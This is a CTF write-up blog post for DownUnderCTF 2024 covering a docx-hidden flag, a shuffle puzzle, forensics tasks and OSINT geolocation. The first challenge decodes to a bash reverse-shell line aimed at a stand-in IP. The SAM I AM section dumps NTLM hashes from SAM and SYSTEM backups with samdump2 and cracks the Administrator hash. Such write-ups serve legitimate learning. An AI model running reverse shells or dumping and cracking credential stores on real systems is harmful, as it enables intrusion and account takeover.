---
title: DownUnderCTF
time: 2024-07-07 12:00:00
categories: [CTF, WriteUps]
tags: [CTF, WriteUps]
image: /assets/posts/DownUnderCTF/0.png
---

Well, now and then, we come across a big CTF like this. Starting out late, let’s see how it goes.

```bash
Authors: AbuCTF, MrRobot, SHL
```

## **Beginner**

### **TLDR please summarize**

**Description**: 

I thought I was being 1337 by asking AI to help me solve challenges, now I have to reinstall Windows again. Can you help me out by find the flag in this document?

**Author**: Nosurf

Given: `EmuWar.Docx`

Straight away, I copy the `docx` file into a `zip` and extract. Going straight to `/word/document.xml` ,

cause that contains the actually content of the `docx` file. Opening in VS Code.

![1](/assets/posts/DownUnderCTF/1.png)

Onto to the pastebin site, we see a `base64` string decoding it, we get the flag.

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/begin]
└─$ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8yNjEuMjYzLjI2My4yNjcvRFVDVEZ7Y2hhdGdwdF9JX24zM2RfMl8zc2NhcDN9IDA+JjE=" | base64 -d
bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1
```

**Flag**: `DUCTF{chatgpt_I_n33d_2_3scap3}`

### **Shufflebox**

**Description**: 

I've learned that if you shuffle your text, it's elrlay hrda to tlle htaw eht nioiglra nutpi aws.

Find the text censored with question marks in `output_censored.txt` and surround it with `DUCTF{}`.

**Author**: hashkitten

**Given**: `shufflebox.py` `output_censored.txt`

The given code in `shufflebox.py` uses a permutation list (`PERM`) to shuffle the characters of a 16-character string. The goal is to reverse this permutation process to find the original string that, when shuffled using the same permutation, results in the given output.

Let's go through the `shufflebox.py` script step by step to understand its functionality.

`shufflebox.py` Breakdown

```python
import random

PERM = list(range(16))
random.shuffle(PERM)
```

1. **Import the random module**: This module will be used to generate a random permutation.
2. **Create a list `PERM` with numbers from 0 to 15**: This represents the indices of a 16-character string.
3. **Shuffle the `PERM` list**: The `random.shuffle(PERM)` function randomly shuffles the elements in the list. This shuffled list will be used as the permutation to reorder characters in the input string.

```python
def apply_perm(s):
    assert len(s) == 16
    return ''.join(s[PERM[p]] for p in range(16))
```

1. **Define the `apply_perm` function**: This function takes a 16-character string `s` as input.
2. **Assert the length of the string**: The function checks if the input string has exactly 16 characters. If not, it raises an assertion error.
3. **Reorder characters using the permutation**: The function returns a new string where each character in the input string `s` is placed at the position specified by the shuffled list `PERM`.

For example, if `PERM` is `[3, 0, 1, 2, 7, 4, 5, 6, 11, 8, 9, 10, 15, 12, 13, 14]` and the input string is "abcdefghijklmnop":

- The character at index `0` in the input string moves to index `3` in the output string.
- The character at index `1` in the input string moves to index `0` in the output string.
- This continues for all 16 characters.

```python
for line in open(0):
    line = line.strip()
    print(line, '->', apply_perm(line))
```

1. **Read input lines**: The script reads lines from the standard input (file descriptor 0). Each line is expected to be a 16-character string.
2. **Strip any extra whitespace**: The script removes leading and trailing whitespace from each line.
3. **Apply the permutation and print the result**: The script applies the `apply_perm` function to the line and prints the original line followed by the permuted line.

Example Execution

Let's walk through an example:

Assume `PERM` after shuffling is `[2, 3, 0, 1, 6, 7, 4, 5, 10, 11, 8, 9, 14, 15, 12, 13]`.

If the input line is "abcdefghijklmnop":

1. The input string "abcdefghijklmnop" will be transformed using the permutation `[2, 3, 0, 1, 6, 7, 4, 5, 10, 11, 8, 9, 14, 15, 12, 13]`.
2. The resulting permuted string will be "cdabghiefjklmnop".

You’d have to be absolutely mental, if you tried to brute-force this.

![2](/assets/posts/DownUnderCTF/2.png)

<aside>
💡 Neither '`rand()`' nor '`random()`' are perfectly random. That's impossible for something that uses only software. To get true randomness you need some kind of external hardware that uses some kind of quantum effect. But for almost every case, nobody cares! But if you're doing cryptography in a secure environment, you ABSOLUTELY MUST NOT use either rand() or random() because if you do, then hackers can easily figure out the sequence and decrypt your secure communications. But for things like games, the very good performance of rand() can be important, so it gets used a LOT.

</aside>

`random.**shuffle**(*x*)`

To shuffle an immutable sequence and return a new shuffled list, use `sample(x, k=len(x))` instead.
Note that even for small `len(x)`, the total number of permutations of *x* can quickly grow larger than the period of most random number generators. This implies that most permutations of a long sequence can never be generated. For example, a sequence of length 2080 is the largest that can fit within the period of the Mersenne Twister random number generator.

At this point, I’ve tried my best. Tried looking at similar past write-ups, even looking at `random.shuffle` module source code. Well, let’s now wait for the write-ups. 

BTW, I came across this portfolio. Absolutely blew me away !

[Alulae | Blog of a gremlin](https://juliapoo.github.io/)

## Miscellaneous

### Discord

**Description:** 

The evil bug has torn one of our flags into pieces and hidden it in our Discord server - https://duc.tf/discord. Can you find all the pieces for us? Form an alliance at `#team-search` to coordinate and expedite your search efforts. Make sure to opt in at `#opt-in-updates` channel to stay updated on new hints and challenges being released. Join us on the journey to defeat the evil bug!

**Author**: DUCTF

First part of the flag can be found it the #team-search channel.

![3](/assets/posts/DownUnderCTF/3.png)

And the second is in #opt-in-updates

![4](/assets/posts/DownUnderCTF/4.png)

**Flag: `DUCTF{f1r57_0f_m4ny}`**

## Forensics

### **Baby's First Forensics**

**Description:** 

They've been trying to breach our infrastructure all morning! They're trying to get more info on our covert kangaroos! We need your help, we've captured some traffic of them attacking us, can you tell us what tool they were using and its version?

**NOTE**: Wrap your answer in the `DUCTF{}`, e.g. `DUCTF{nmap_7.25}`

**Author**: Pix

**Given**: `capture.pcap`

Since, we were to find just the tool the attacker is using, I just used `strings` on it to find the tool.

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/forensics]
└─$ strings capture.pcap | more
in-addr
arpa
in-addr
arpa
root-servers
nstld
verisign-grs
HEAD / HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)
Host: 172.16.17.135
```

**Flag**: `DUCTF{Nikto_2.1.6}`


### **SAM I AM**

**Description:** 

The attacker managed to gain Domain Admin on our rebels Domain Controller! Looks like they managed to log on with an account using WMI and dumped some files.

Can you reproduce how they got the Administrator's Password with the artifacts provided?

Place the Administrator Account's Password in `DUCTF{}`, e.g. `DUCTF{password123!}`

**Author**: TurboPenguin

Given: `samiam.zip`

Unzipping the file, we get a `system.bak` and `sam.bak`

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/forensics]
└─$ unzip samiam.zip
Archive:  samiam.zip
  inflating: samiam/sam.bak
  inflating: samiam/system.bak
```

Since, I had experience with SAM registry files. This time  the SYSTEM file was also provided. Went straight to `samdump2`

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/forensics/samiam]
└─$ samdump2 system.bak sam.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:476b4dddbbffde29e739b618580adb1e:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Using `crackstation`, we crack the NTLM hash.

![5](/assets/posts/DownUnderCTF/5.png)

**Flag**: `DUCTF{!checkerboard1}`

## OSINT

### offtheramp

**Description**: 

That looks like a pretty cool place to escape by boat, EXAMINE the image and discover the name of this structure.

NOTE: Flag is case-insensitive and requires placing inside `DUCTF{}`! e.g `DUCTF{name_of_structure}`

**Author**: Anon

Given: `offtheramp.jpg`

![6](/assets/posts/DownUnderCTF/6.jpeg)

Been using an AI called `picarta` , to help narrow down photos for OSINT.

![7](/assets/posts/DownUnderCTF/7.png)

Now, this gave me a straight hit. Damn.

![8](/assets/posts/DownUnderCTF/8.png)

**Flag**: `DUCTF{olivers_hill_boat_ramp}`

### **cityviews**

**Description**: 

After having to go on the run, I've had to bunker down. Which building did I capture this picture from?

NOTE: Flag is case-insensitive and requires placing inside `DUCTF{}`! e.g `DUCTF{building_name}`

**Author**: Anon

**Given**: `cityviews.jpg`

Turns out, we still in Melbourne.

![9](/assets/posts/DownUnderCTF/9.png)

First, I found the source, by playing around with google lens.

![10](/assets/posts/DownUnderCTF/10.png)

Found this image, and then narrowed down.

**Flag: `DUCTF{hotel_indigo}`**






![Continue](/assets/posts/PrivEscalation/continue.jpg)